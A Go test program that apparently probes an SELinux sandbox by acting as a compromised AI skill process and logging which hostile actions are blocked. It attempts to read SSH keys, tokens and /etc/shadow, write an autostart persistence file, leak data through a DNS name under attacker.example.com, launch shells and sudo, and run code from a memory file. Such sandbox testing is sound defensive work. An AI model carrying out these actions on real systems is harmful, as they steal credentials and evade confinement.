// Command probe plays a compromised skill process: it tries everything a
// process that read hostile content might try, and prints one JSON line
// per attempt with the outcome. The lab copies it with the SELinux type
// of a skill program (basalt_skill_exec_t, basalt_skill_index_exec_t,
// basalt_voice_exec_t), so it runs in that domain, and (for the worker)
// inside a session registered with basalt-resolver.
package main

import (
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

type result struct {
	Attempt string `json:"attempt"`
	Allowed bool   `json:"allowed"`
	Detail  string `json:"detail"`
}

func out(attempt string, err error, detail string) {
	r := result{Attempt: attempt, Allowed: err == nil, Detail: detail}
	if err != nil {
		r.Detail = err.Error()
	}
	b, _ := json.Marshal(r)
	fmt.Println(string(b))
}

func readFile(name, p string) {
	b, err := os.ReadFile(p)
	d := ""
	if err == nil {
		d = fmt.Sprintf("read %d bytes", len(b))
	}
	out(name, err, d)
}

func dialUnix(name, p string) {
	c, err := net.DialTimeout("unix", p, 2*time.Second)
	if err == nil {
		c.Close()
	}
	out(name, err, "connected")
}

func dialTCP(name, addr string) {
	c, err := net.DialTimeout("tcp", addr, 3*time.Second)
	if err == nil {
		c.Close()
	}
	out(name, err, "connected")
}

func main() {
	if len(os.Args) > 1 && os.Args[1] == "--noop" {
		return
	}
	home := os.Getenv("HOME")
	rt := os.Getenv("XDG_RUNTIME_DIR")
	if rt == "" {
		rt = fmt.Sprintf("/run/user/%d", os.Getuid())
	}
	if b, err := os.ReadFile("/proc/self/attr/current"); err == nil {
		out("domain", nil, strings.TrimRight(string(b), "\x00\n"))
	}
	readFile("read ~/.ssh/id_ed25519", filepath.Join(home, ".ssh/id_ed25519"))
	readFile("read ~/.config/lab-secret/token.txt", filepath.Join(home, ".config/lab-secret/token.txt"))
	readFile("read the mail password file", filepath.Join(home, ".config/basalt-shell/mail-lab.pass"))
	readFile("read a document in ~/Documents", filepath.Join(home, "Documents/notes/recipes.md"))
	readFile("read the shell's activity log", filepath.Join(home, ".local/state/basalt-shell/audit.jsonl"))
	readFile("read the file index", filepath.Join(home, ".local/share/basalt-skills/index.json"))
	readFile("read /etc/shadow", "/etc/shadow")
	err := os.WriteFile(filepath.Join(home, "pwned.txt"), []byte("x"), 0o600)
	out("write ~/pwned.txt", err, "written")
	_ = os.Remove(filepath.Join(home, "pwned.txt"))
	err = os.WriteFile(filepath.Join(home, "Documents/pwned.txt"), []byte("x"), 0o600)
	out("write ~/Documents/pwned.txt", err, "written")
	_ = os.Remove(filepath.Join(home, "Documents/pwned.txt"))
	err = os.WriteFile(filepath.Join(home, ".config/autostart/pwned.desktop"), []byte("x"), 0o600)
	out("write ~/.config/autostart (persistence)", err, "written")
	_ = os.Remove(filepath.Join(home, ".config/autostart/pwned.desktop"))
	dialUnix("connect the Wayland socket", filepath.Join(rt, "wayland-1"))
	dialUnix("connect the session D-Bus", filepath.Join(rt, "bus"))
	dialUnix("connect PipeWire (microphone)", filepath.Join(rt, "pipewire-0"))
	dialUnix("connect the shell daemon", filepath.Join(rt, "basalt-shell/shell.sock"))
	dialUnix("connect the voice service", filepath.Join(rt, "basalt-voice/voice.sock"))
	dialUnix("connect the local model socket", "/run/basalt-llm/llm.sock")
	dialUnix("connect basalt-resolver control", "/run/basalt-resolver/control.sock")
	dialTCP("connect evil.lab.test:80 by address (10.77.0.66)", "10.77.0.66:80")
	dialTCP("connect a public address (1.1.1.1:443)", "1.1.1.1:443")
	dialTCP("connect news.lab.test by address (10.77.0.10:80)", "10.77.0.10:80")
	addrs, err := net.LookupHost("evil.lab.test")
	out("resolve evil.lab.test", err, strings.Join(addrs, ","))
	addrs, err = net.LookupHost("exfil-SECRETDATA.attacker.example.com")
	out("resolve a name carrying data", err, strings.Join(addrs, ","))
	c, err := net.DialTimeout("udp", "8.8.8.8:53", 2*time.Second)
	if err == nil {
		_, err = c.Write([]byte{0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 3, 'x', 'y', 'z', 0, 0, 1, 0, 1})
		if err == nil {
			_ = c.SetReadDeadline(time.Now().Add(2 * time.Second))
			buf := make([]byte, 512)
			_, err = c.Read(buf)
		}
		c.Close()
	}
	out("DNS to 8.8.8.8 directly", err, "answered")
	run := func(name string, argv ...string) {
		c := exec.Command(argv[0], argv[1:]...)
		c.Stdout, c.Stderr = nil, nil
		err := c.Run()
		// Started is what counts: a program that ran and exited non-zero
		// was still executed.
		var ee *exec.ExitError
		if errors.As(err, &ee) {
			err = nil
		}
		out(name, err, "executed")
	}
	// Shells, interpreters and setuid helpers: never.
	run("run /bin/sh", "/bin/sh", "-c", "true")
	run("run /usr/bin/bash", "/usr/bin/bash", "-c", "true")
	run("run python3", "/usr/bin/python3", "-c", "pass")
	run("sudo", "/usr/bin/sudo", "-n", "true")
	run("su", "/usr/bin/su", "-c", "true")
	run("pkexec", "/usr/bin/pkexec", "--version")
	run("newgrp", "/usr/bin/newgrp", "wheel")
	run("passwd", "/usr/bin/passwd", "--status")
	run("the dynamic loader running bash", "/lib64/ld-linux-x86-64.so.2", "/usr/bin/bash", "-c", "true")
	// A program it writes itself (a copy of this probe) in /tmp, and from
	// a memory file.
	self, _ := os.ReadFile("/proc/self/exe")
	tmp := filepath.Join(os.TempDir(), fmt.Sprintf("probe-copy-%d", os.Getpid()))
	if werr := os.WriteFile(tmp, self, 0o700); werr != nil {
		out("write a program in /tmp", werr, "")
	} else {
		run("run a program it wrote in /tmp", tmp, "--noop")
		_ = os.Remove(tmp)
	}
	if fd, merr := memfd(); merr != nil {
		out("create a memory file", merr, "")
	} else {
		f := os.NewFile(uintptr(fd), "memfd")
		_, _ = f.Write(self)
		run("run a program from a memory file", fmt.Sprintf("/proc/self/fd/%d", fd), "--noop")
		f.Close()
	}
	// The programs some domain needs (allowed only where needed).
	run("tool: pw-record (voice)", "/usr/bin/pw-record", "--version")
	run("tool: whisper-cli (voice)", "/usr/lib64/basalt-voice/whisper-cli", "--help")
	run("tool: pdftotext (indexer)", "/usr/bin/pdftotext", "-v")
	run("tool: chromium (worker)", "/usr/lib64/chromium-browser/chromium-browser", "--version")
	// File changes (only the mover renames, inside the person's folders).
	src := filepath.Join(home, "Documents/probe-rename-src.txt")
	dst := filepath.Join(home, "Documents/probe-rename-dst.txt")
	if _, serr := os.Stat(src); serr == nil {
		err = os.Rename(src, dst)
		out("rename a file in ~/Documents", err, "renamed")
		if err == nil {
			_ = os.Rename(dst, src)
		}
		err = os.Remove(src)
		out("delete a file in ~/Documents", err, "deleted")
	}
	err = os.Rename(filepath.Join(home, ".ssh/id_ed25519"), filepath.Join(home, ".ssh/id_moved"))
	out("rename the SSH key", err, "renamed")
	if err == nil {
		_ = os.Rename(filepath.Join(home, ".ssh/id_moved"), filepath.Join(home, ".ssh/id_ed25519"))
	}
	dialTCP("connect SMTP by name (mail.example.com:587)", "mail.example.com:587")
	dialTCP("connect SMTP by address (10.77.0.21:587)", "10.77.0.21:587")
}

// memfd creates an anonymous memory file (memfd_create).
func memfd() (int, error) {
	name, _ := syscall.BytePtrFromString("probe")
	fd, _, e := syscall.Syscall(319, uintptr(unsafe.Pointer(name)), 0, 0) // SYS_memfd_create on x86-64
	if e != 0 {
		return -1, e
	}
	return int(fd), nil
}
